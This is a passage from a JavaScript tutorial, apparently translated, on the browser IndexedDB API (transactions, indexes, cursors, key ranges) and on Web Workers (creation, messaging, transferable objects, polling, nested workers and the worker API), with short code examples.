var trans2 = db.transaction('foo', 'readwrite');
var objectStore2 = trans2.objectStore('foo')
var objectStore1 = trans1.objectStore('foo')
objectStore2.put('2', 'key');
objectStore1.put('1', 'key');
```

In the code above, the value corresponding to `key` ends up being `2`, not `1`. This is because the transaction `trans1` is created before `trans2`, so it is executed first.

Note that a transaction may fail; only when the transaction's `complete` event is observed can the transaction operation be guaranteed to have succeeded.

The IDBTransaction object has the following properties.

- `IDBTransaction.db`: returns the database object IDBDatabase the current transaction is in.
- `IDBTransaction.error`: returns the error of the current transaction. If the transaction has not ended, or the transaction ended successfully, or it was manually terminated, this method returns `null`.
- `IDBTransaction.mode`: returns the mode of the current transaction, defaulting to `readonly` (read-only), with the other value being `readwrite`.
- `IDBTransaction.objectStoreNames`: returns an array-like object DOMStringList whose members are the names of the object stores involved in the current transaction.
- `IDBTransaction.onabort`: specifies the listener function for the `abort` event (transaction interrupted).
- `IDBTransaction.oncomplete`: specifies the listener function for the `complete` event (transaction succeeded).
- `IDBTransaction.onerror`: specifies the listener function for the `error` event (transaction failed).

The IDBTransaction object has the following methods.

- `IDBTransaction.abort()`: terminates the current transaction and rolls back all changes already made.
- `IDBTransaction.objectStore(name)`: returns the object store IDBObjectStore with the specified name.



### 9. The IDBIndex object

The IDBIndex object represents a database index, through which you can obtain records in the database. A data record's primary key has an index by default; the IDBIndex object is mainly used to build an index and obtain objects via keys other than the primary key.

IDBIndex is a persistent key-value store. As long as data records in the referenced object store are inserted, updated, or deleted, the index is automatically updated.

The `IDBObjectStore.index()` method can obtain an IDBIndex object.

```js
var transaction = db.transaction(['contactsList'], 'readonly');
var objectStore = transaction.objectStore('contactsList');
var myIndex = objectStore.index('lName');

myIndex.openCursor().onsuccess = function (event) {
  var cursor = event.target.result;
  if (cursor) {
    var tableRow = document.createElement('tr');
    tableRow.innerHTML =   '<td>' + cursor.value.id + '</td>'
                         + '<td>' + cursor.value.lName + '</td>'
                         + '<td>' + cursor.value.fName + '</td>'
                         + '<td>' + cursor.value.jTitle + '</td>'
                         + '<td>' + cursor.value.company + '</td>'
                         + '<td>' + cursor.value.eMail + '</td>'
                         + '<td>' + cursor.value.phone + '</td>'
                         + '<td>' + cursor.value.age + '</td>';
    tableEntry.appendChild(tableRow);

    cursor.continue();
  } else {
    console.log('Entries all displayed.');
  }
};
```

The IDBIndex object has the following properties.

- `IDBIndex.name`: a string, the name of the index.
- `IDBIndex.objectStore`: the object store the index is in.
- `IDBIndex.keyPath`: the primary key of the index.
- `IDBIndex.multiEntry`: a boolean value; for the case where `keyPath` is an array, if set to `true`, when creating the array each array member has an entry, otherwise each array has only one entry.
- `IDBIndex.unique`: a boolean value indicating whether identical primary keys are allowed when creating the index.

The IDBIndex object has the following methods, all of which are asynchronous and immediately return an IDBRequest object.

- `IDBIndex.count()`: used to obtain the number of records. It can accept a primary key or an IDBKeyRange object as an argument, in which case it returns only the number of records matching the primary key; otherwise it returns the number of all records.
- `IDBIndex.get(key)`: used to obtain the data record matching the specified primary key.
- `IDBIndex.getKey(key)`: used to obtain the specified primary key.
- `IDBIndex.getAll()`: used to obtain all data records. It can accept two arguments, both optional; the first argument specifies the primary key, and the second argument specifies the number of records to return. If both arguments are omitted, all records are returned. Since on a successful retrieval the browser must generate all the objects, this affects performance. If the dataset is relatively large, it is recommended to use the IDBCursor object.
- `IDBIndex.getAllKeys()`: this method is similar to the `IDBIndex.getAll()` method, the difference being that it obtains all primary keys.
- `IDBIndex.openCursor()`: used to obtain an IDBCursor object for iterating over all entries in the index.
- `IDBIndex.openKeyCursor()`: this method is similar to the `IDBIndex.openCursor()` method, the difference being that it iterates over the primary keys of all entries.



### 10. The IDBCursor object

The IDBCursor object represents a cursor object, used to iterate over the records of an object store (IDBObjectStore) or an index (IDBIndex).

The IDBCursor object is generally obtained via the `IDBObjectStore.openCursor()` method.

```js
var transaction = db.transaction(['rushAlbumList'], 'readonly');
var objectStore = transaction.objectStore('rushAlbumList');

objectStore.openCursor(null, 'next').onsuccess = function(event) {
  var cursor = event.target.result;
  if (cursor) {
    var listItem = document.createElement('li');
      listItem.innerHTML = cursor.value.albumTitle + ', ' + cursor.value.year;
      list.appendChild(listItem);

      console.log(cursor.source);
      cursor.continue();
    } else {
      console.log('Entries all displayed.');
    }
  };
};
```

Properties of the IDBCursor object.

- `IDBCursor.source`: returns the object store or index being iterated over.
- `IDBCursor.direction`: a string representing the direction of cursor iteration. There are four possible values: next (iterate forward from the beginning), nextunique (iterate forward from the beginning, iterating duplicate values only once), prev (iterate backward from the end), prevunique (iterate backward from the end, iterating duplicate values only once). This property is specified via the second argument of the `IDBObjectStore.openCursor()` method, and once specified it cannot be changed.
- `IDBCursor.key`: returns the primary key of the current record.
- `IDBCursor.value`: returns the data value of the current record.
- IDBCursor.primaryKey: returns the primary key of the current record. For an object store, this property is equivalent to IDBCursor.key; for an index, IDBCursor.key returns the index's position value, and this property returns the primary key of the data record.

The IDBCursor object has the following methods.

- `IDBCursor.advance(n)`: moves the cursor forward by n positions.
- `IDBCursor.continue()`: moves the cursor forward by one position. It can accept a primary key as an argument, in which case it jumps to this primary key.
- `IDBCursor.continuePrimaryKey()`: this method requires two arguments, the first being `key` and the second being `primaryKey`, and moves the cursor to the position matching these two arguments.
- `IDBCursor.delete()`: used to delete the record at the current position, returning an IDBRequest object. This method does not change the cursor's position.
- `IDBCursor.update()`: used to update the record at the current position, returning an IDBRequest object. Its argument is the new value to be written to the database.



### 11. The IDBKeyRange object

The IDBKeyRange object represents a set of primary keys in an object store. Based on this set of primary keys, you can obtain a set of records in the object store or index.

IDBKeyRange can contain just a single value, or specify an upper bound and lower bound. It has four static methods for specifying the range of primary keys.

- `IDBKeyRange.lowerBound()`: specifies the lower bound.
- `IDBKeyRange.upperBound()`: specifies the upper bound.
- `IDBKeyRange.bound()`: specifies both the upper and lower bounds.
- `IDBKeyRange.only()`: specifies that only a single value is contained.

Below are some code examples.

```js
// All keys ≤ x
var r1 = IDBKeyRange.upperBound(x);

// All keys < x
var r2 = IDBKeyRange.upperBound(x, true);

// All keys ≥ y
var r3 = IDBKeyRange.lowerBound(y);

// All keys > y
var r4 = IDBKeyRange.lowerBound(y, true);

// All keys ≥ x && ≤ y
var r5 = IDBKeyRange.bound(x, y);

// All keys > x &&< y
var r6 = IDBKeyRange.bound(x, y, true, true);

// All keys > x && ≤ y
var r7 = IDBKeyRange.bound(x, y, true, false);

// All keys ≥ x &&< y
var r8 = IDBKeyRange.bound(x, y, false, true);

// The key = z
var r9 = IDBKeyRange.only(z);
```

The three methods `IDBKeyRange.lowerBound()`, `IDBKeyRange.upperBound()`, and `IDBKeyRange.bound()` include the endpoint values by default; you can pass in a boolean value to change this property.

Correspondingly, the IDBKeyRange object has four read-only properties.

- `IDBKeyRange.lower`: returns the lower bound
- `IDBKeyRange.lowerOpen`: a boolean value indicating whether the lower bound is an open interval (that is, whether the lower bound is excluded from the range)
- `IDBKeyRange.upper`: returns the upper bound
- `IDBKeyRange.upperOpen`: a boolean value indicating whether the upper bound is an open interval (that is, whether the upper bound is excluded from the range)

After an IDBKeyRange instance object is generated, by passing it as an argument to the `openCursor()` method of an IDBObjectStore or IDBIndex object, you can read data within the set range.

```js
var t = db.transaction(['people'], 'readonly');
var store = t.objectStore('people');
var index = store.index('name');

var range = IDBKeyRange.bound('B', 'D');

index.openCursor(range).onsuccess = function (e) {
  var cursor = e.target.result;
  if (cursor) {
    console.log(cursor.key + ':');

    for (var field in cursor.value) {
      console.log(cursor.value[field]);
    }
    cursor.continue();
  }
}
```

IDBKeyRange has an instance method `includes(key)` that returns a boolean value indicating whether a certain primary key is contained within the current primary key set.

```js
var keyRangeValue = IDBKeyRange.bound('A', 'K', false, false);

keyRangeValue.includes('F') // true
keyRangeValue.includes('W') // false
```



## 15. Web Workers

### 1. Overview

The JavaScript language uses a single-threaded model, which means that all tasks can only be completed on a single thread, and only one thing can be done at a time. If the preceding task is not finished, the following tasks can only wait. As computer computing power has grown stronger, especially with the emergence of multi-core CPUs, single-threading brings great inconvenience and cannot fully utilize the computer's computing power.

The role of the Web Worker is to create a multi-threaded environment for JavaScript, allowing the main thread to create Worker threads and assign some tasks to the latter to run. While the main thread runs, the Worker thread runs in the background, and the two do not interfere with each other. Once the Worker thread completes its computation task, it returns the result to the main thread. The benefit of this is that some compute-intensive or high-latency tasks can be handed off to the Worker thread to execute, and the main thread (which usually handles UI interaction) can remain smooth without being blocked or slowed down.

Once a Worker thread is successfully created, it runs continuously and is not interrupted by activities on the main thread (such as the user clicking a button or submitting a form). This is advantageous for responding to communication from the main thread at any time. However, this also makes Workers relatively resource-intensive, so they should not be overused, and once they are no longer needed, they should be closed.

Web Workers have the following usage considerations.

(1) **Same-origin restriction**

The script file assigned to run on the Worker thread must be same-origin with the main thread's script file.

(2) **DOM restriction**

The global object where the Worker thread resides is different from that of the main thread; it cannot read the DOM objects of the page where the main thread resides, nor can it use the `document`, `window`, and `parent` objects. However, the Worker thread can use the `navigator` object and the `location` object.

(3) **Global object restriction**

The Worker's global object `WorkerGlobalScope` is different from the web page's global object `Window`, and many interfaces are not accessible. For example, in theory the Worker thread cannot use `console.log`, because the standard does not mention that the Worker's global object has a `console` interface; only the `Navigator` interface and the `Location` interface are defined. However, browsers actually support the Worker thread using `console.log`, but the safe approach is still not to use this method.

(4) **Communication**

The Worker thread and the main thread are not in the same context, so they cannot communicate directly and must do so through messages.

(5) **Script restriction**

The Worker thread cannot execute the `alert()` method and the `confirm()` method, but it can use the XMLHttpRequest object to make AJAX requests.

(6) **File restriction**

The Worker thread cannot read local files, that is, it cannot open the local machine's file system (`file://`); the scripts it loads must come from the network.



### 2. Basic usage

#### 2.1 The main thread

The main thread uses the `new` command to call the `Worker()` constructor and create a new Worker thread.

```js
var worker = new Worker('work.js');
```

The argument of the `Worker()` constructor is a script file, which is the task the Worker thread will execute. Since the Worker cannot read local files, this script must come from the network. If the download does not succeed (for example, a 404 error), the Worker fails silently.

Then, the main thread calls the `worker.postMessage()` method to send a message to the Worker.

```js
worker.postMessage('Hello World');
worker.postMessage({method: 'echo', args: ['Work']});
```

The argument of the `worker.postMessage()` method is the data the main thread passes to the Worker. It can be various data types, including binary data.

Next, the main thread uses `worker.onmessage` to specify a listener function to receive messages sent back by the child thread.

```js
worker.onmessage = function (event) {
  doSomething(event.data);
}

function doSomething() {
  // execute the task
  worker.postMessage('Work done!');
}
```

In the code above, the event object's `data` property can obtain the data sent by the Worker.

After the Worker completes its task, the main thread can shut it down.

```js
worker.terminate();
```

#### 2.2 The Worker thread

Inside the Worker thread, there needs to be a listener function listening for the `message` event.

```js
self.addEventListener('message', function (e) {
  self.postMessage('You said: ' + e.data);
}, false);
```

In the code above, `self` represents the child thread itself, that is, the child thread's global object. Therefore, it is equivalent to the following two forms.

```js
// form 1
this.addEventListener('message', function (e) {
  this.postMessage('You said: ' + e.data);
}, false);

// form 2
addEventListener('message', function (e) {
  postMessage('You said: ' + e.data);
}, false);
```

Besides using `self.addEventListener()` to specify the listener function, you can also use `self.onmessage` to specify it. The argument of the listener function is an event object, whose `data` property contains the data sent by the main thread. The `self.postMessage()` method is used to send a message to the main thread.

Based on the data sent by the main thread, the Worker thread can call different methods; below is an example.

```js
self.addEventListener('message', function (e) {
  var data = e.data;
  switch (data.cmd) {
    case 'start':
      self.postMessage('WORKER STARTED: ' + data.msg);
      break;
    case 'stop':
      self.postMessage('WORKER STOPPED: ' + data.msg);
      self.close(); // Terminates the worker.
      break;
    default:
      self.postMessage('Unknown command: ' + data.msg);
  };
}, false);
```

In the code above, `self.close()` is used to close itself from within the Worker.



#### 2.3 The Worker loading scripts

If the Worker needs to load other scripts internally, there is a dedicated method `importScripts()`.

```js
importScripts('script1.js');
```

This method can load multiple scripts at the same time.

```js
importScripts('script1.js', 'script2.js');
```



#### 2.4 Error handling

The main thread can listen for whether an error occurs in the Worker. If an error occurs, the Worker triggers the main thread's `error` event.

```js
worker.onerror(function (event) {
  console.log([
    'ERROR: Line ', event.lineno, ' in ', event.filename, ': ', event.message
  ].join(''));
});

// or
worker.addEventListener('error', function (event) {
  // ...
});
```

The `error` event can also be listened for inside the Worker.



#### 2.5 Closing the Worker

After use, to save system resources, the Worker must be closed.

```js
// main thread
worker.terminate();

// Worker thread
self.close();
```



### 3. Data communication

As mentioned earlier, the content communicated between the main thread and the Worker can be text or an object. Note that this communication is a copy relationship, that is, pass-by-value rather than pass-by-reference; the Worker's modifications to the communicated content do not affect the main thread. In fact, the browser's internal mechanism is to first serialize the communicated content, then send the serialized string to the Worker, which then restores it.

The main thread and the Worker can also exchange binary data, such as File, Blob, ArrayBuffer, and other types, which can also be sent between threads. Below is an example.

```js
// main thread
var uInt8Array = new Uint8Array(new ArrayBuffer(10));
for (var i = 0; i < uInt8Array.length; ++i) {
  uInt8Array[i] = i * 2; // [0, 2, 4, 6, 8,...]
}
worker.postMessage(uInt8Array);

// Worker thread
self.onmessage = function (e) {
  var uInt8Array = e.data;
  postMessage('Inside worker.js: uInt8Array.toString() = ' + uInt8Array.toString());
  postMessage('Inside worker.js: uInt8Array.byteLength = ' + uInt8Array.byteLength);
};
```

However, sending binary data by copying causes performance problems. For example, if the main thread sends a 500MB file to the Worker, by default the browser generates a copy of the original file. To solve this problem, JavaScript allows the main thread to transfer binary data directly to the child thread, but once transferred, the main thread can no longer use this binary data; this is to prevent the troublesome situation of multiple threads modifying data simultaneously. This method of transferring data is called [Transferable Objects](https://www.w3.org/html/wg/drafts/html/master/infrastructure.html#transferable-objects). This allows the main thread to quickly hand data to the Worker, which is very convenient for image processing, sound processing, 3D computation, etc., without incurring a performance burden.

To directly transfer control of the data, you need to use the following form.

```js
// Transferable Objects format
worker.postMessage(arrayBuffer, [arrayBuffer]);

// example
var ab = new ArrayBuffer(1);
worker.postMessage(ab, [ab]);
```



### 4. Web Worker on the same page

Usually, a Worker loads a separate JavaScript script file, but it can also load code on the same page as the main thread.

```html
<!DOCTYPE html>
  <body>
    <script id="worker" type="app/worker">
      addEventListener('message', function () {
        postMessage('some message');
      }, false);
    </script>
  </body>
</html>
```

The above is a script embedded in the page; note that you must specify the `type` attribute of the `<script>` tag as a value the browser does not recognize, which in the example above is `app/worker`.

Then, read this script embedded in the page and process it with a Worker.

```js
var blob = new Blob([document.querySelector('#worker').textContent]);
var url = window.URL.createObjectURL(blob);
var worker = new Worker(url);

worker.onmessage = function (e) {
  // e.data === 'some message'
};
```

In the code above, the script code embedded in the page is first converted into a binary object, then a URL is generated for this binary object, and then the Worker is made to load this URL. This achieves having both the main thread's and the Worker's code on the same page.



### 5. Example: a Worker thread doing polling

Sometimes the browser needs to poll the server status in order to learn of a status change at the first opportunity. This work can be placed inside a Worker.

```js
function createWorker(f) {
  var blob = new Blob(['(' + f.toString() + ')()']);
  var url = window.URL.createObjectURL(blob);
  var worker = new Worker(url);
  return worker;
}

var pollingWorker = createWorker(function (e) {
  var cache;

  function compare(new, old) { ... };

  setInterval(function () {
    fetch('/my-api-endpoint').then(function (res) {
      var data = res.json();

      if (!compare(data, cache)) {
        cache = data;
        self.postMessage(data);
      }
    })
  }, 1000)
});

pollingWorker.onmessage = function () {
  // render data
}

pollingWorker.postMessage('init');
```

In the code above, the Worker polls the data once per second and then compares it with the cache. If they are inconsistent, it means there is a new change on the server side, so the main thread needs to be notified.



### 6. Example: a Worker creating a Worker

A Worker thread can also create another Worker thread internally (currently only the Firefox browser supports this). The example below distributes a compute-intensive task to 10 Workers.

The main thread code is as follows.

```js
var worker = new Worker('worker.js');
worker.onmessage = function (event) {
  document.getElementById('result').textContent = event.data;
};
```

The Worker thread code is as follows.

```js
// worker.js

// settings
var num_workers = 10;
var items_per_worker = 1000000;

// start the workers
var result = 0;
var pending_workers = num_workers;
for (var i = 0; i < num_workers; i += 1) {
  var worker = new Worker('core.js');
  worker.postMessage(i * items_per_worker);
  worker.postMessage((i + 1) * items_per_worker);
  worker.onmessage = storeResult;
}

// handle the results
function storeResult(event) {
  result += event.data;
  pending_workers -= 1;
  if (pending_workers <= 0)
    postMessage(result); // finished!
}
```

In the code above, the Worker thread internally creates 10 Worker threads and sends messages to these 10 Workers in turn, informing them of the start and end points of the computation. The code of the computation task script is as follows.

```js
// core.js
var start;
onmessage = getStart;
function getStart(event) {
  start = event.data;
  onmessage = getEnd;
}

var end;
function getEnd(event) {
  end = event.data;
  onmessage = null;
  work();
}

function work() {
  var result = 0;
  for (var i = start; i < end; i += 1) {
    // perform some complex calculation here
    result += 1;
  }
  postMessage(result);
  close();
}
```



### 7. API

#### 7.1 The main thread

The browser natively provides the `Worker()` constructor for the main thread to generate Worker threads.

```js
var myWorker = new Worker(jsUrl, options);
```

The `Worker()` constructor can accept two arguments. The first argument is the script's URL (which must obey the same-origin policy); this argument is required and can only load a JS script, otherwise an error is thrown. The second argument is a configuration object, which is optional. One of its uses is to specify the Worker's name, used to distinguish multiple Worker threads.

```js
// main thread
var myWorker = new Worker('worker.js', { name : 'myWorker' });

// Worker thread
self.name // myWorker
```

The `Worker()` constructor returns a Worker thread object for the main thread to operate the Worker. The properties and methods of the Worker thread object are as follows.

- Worker.onerror: specifies the listener function for the error event.
- Worker.onmessage: specifies the listener function for the message event; the sent data is in the `Event.data` property.
- Worker.onmessageerror: specifies the listener function for the messageerror event. This event is triggered when the sent data cannot be serialized into a string.
- Worker.postMessage(): sends a message to the Worker thread.
- Worker.terminate(): immediately terminates the Worker thread.



#### 7.2 The Worker thread

A Web Worker has its own global object, which is not the main thread's `window` but a global object specially customized for the Worker. Therefore, not all of the objects and methods defined on `window` can be used.

The Worker thread has some of its own global properties and methods.

- self.name: the Worker's name. This property is read-only and is specified by the constructor.
- self.onmessage: specifies the listener function for the `message` event.
- self.onmessageerror: specifies the listener function for the messageerror event. This event is triggered when the sent data cannot be serialized into a string.
- self.close(): closes the Worker thread.
- self.postMessage(): sends a message to the thread that created this Worker thread.
- self.importScripts(): loads a JS script.
